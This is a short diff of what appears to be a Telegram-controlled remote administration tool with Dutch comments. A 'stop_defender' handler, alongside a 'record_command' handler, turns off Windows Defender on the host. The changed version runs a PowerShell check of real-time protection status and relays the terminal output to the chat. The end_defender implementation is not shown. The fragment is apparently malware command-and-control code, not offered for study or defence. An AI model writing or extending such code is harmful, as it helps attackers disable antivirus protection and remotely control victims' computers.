@@ -35,9 +35,8 @@ async def record_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 # Windows defender uitzetten
 async def stop_defender(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # meld dat Windows defender uit is
-    await context.bot.send_message(chat_id=update.effective_chat.id, text="Windows Defender is uitgeschakeld")
-    end_defender()
-
+    commandOutput = end_defender('Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled')
+    await update.message.reply_text(f"Terminal output:```\n{commandOutput}\n```", parse_mode='MarkdownV2')
 
 # Log errors
 async def log_error(update: Update, context: ContextTypes.DEFAULT_TYPE):
